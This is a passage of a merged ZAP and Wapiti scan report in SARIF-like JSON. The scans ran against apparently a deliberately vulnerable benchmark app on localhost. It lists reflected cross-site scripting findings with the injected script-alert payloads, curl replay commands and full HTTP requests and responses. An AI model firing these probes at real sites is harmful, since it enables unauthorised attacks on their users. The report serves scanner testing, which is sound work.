                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01260",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01260?secure=default&productID=default&foo=foo&BenchmarkTest01260=%3CScRiPt%3Ealert%28%27wz83ehfaya%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wz83ehfaya')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wz83ehfaya')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01260\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01260.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest01260=%3CScRiPt%3Ealert%28%27wz83ehfaya%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01260"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01260', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01260.html?BenchmarkTest01260=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAxMjYwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01260', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01260.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest01260=%3CScRiPt%3Ealert%28%27wz83ehfaya%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:24:27 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wz83ehfaya')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01261",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01261?BenchmarkTest01261=SafeText&BenchmarkTest01261=Movies&BenchmarkTest01261=Writing&BenchmarkTest01261=%3CScRiPt%3Ealert%28%27wam1kkjgz8%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wam1kkjgz8')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wam1kkjgz8')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01261\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01261.html\" -d \"BenchmarkTest01261=SafeText&BenchmarkTest01261=Movies&BenchmarkTest01261=Writing&BenchmarkTest01261=%3CScRiPt%3Ealert%28%27wam1kkjgz8%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01261"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01261', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01261.html?BenchmarkTest01261=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMjYxPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01261', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01261.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01261=SafeText&BenchmarkTest01261=Movies&BenchmarkTest01261=Writing&BenchmarkTest01261=%3CScRiPt%3Ealert%28%27wam1kkjgz8%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:56 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:24:33 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wam1kkjgz8')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01266",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01266?BenchmarkTest01266=SafeText&BenchmarkTest01266=Movies&BenchmarkTest01266=Writing&BenchmarkTest01266=%3CScRiPt%3Ealert%28%27wnt8yj3zlj%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wnt8yj3zlj')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wnt8yj3zlj')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01266\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01266.html?BenchmarkTest01266=SafeText\" -d \"BenchmarkTest01266=SafeText&BenchmarkTest01266=Movies&BenchmarkTest01266=Writing&BenchmarkTest01266=%3CScRiPt%3Ealert%28%27wnt8yj3zlj%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01266"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01266', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01266.html?BenchmarkTest01266=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMjY2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01266', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01266.html?BenchmarkTest01266=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01266=SafeText&BenchmarkTest01266=Movies&BenchmarkTest01266=Writing&BenchmarkTest01266=%3CScRiPt%3Ealert%28%27wnt8yj3zlj%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:56 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:24:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wnt8yj3zlj')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01267",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01267?BenchmarkTest01267=%3CScRiPt%3Ealert%28%27we3b5yebci%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('we3b5yebci')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('we3b5yebci')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01267\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01267.html\" -d \"BenchmarkTest01267=%3CScRiPt%3Ealert%28%27we3b5yebci%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01267"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01267', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01267.html?BenchmarkTest01267=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMjY3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01267', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01267.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01267=%3CScRiPt%3Ealert%28%27we3b5yebci%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:56 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:24:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('we3b5yebci')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01284",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01284?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01284=%3CScRiPt%3Ealert%28%27w4ng87v3zp%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w4ng87v3zp')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w4ng87v3zp')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01284\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01284.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01284=%3CScRiPt%3Ealert%28%27w4ng87v3zp%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01284"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
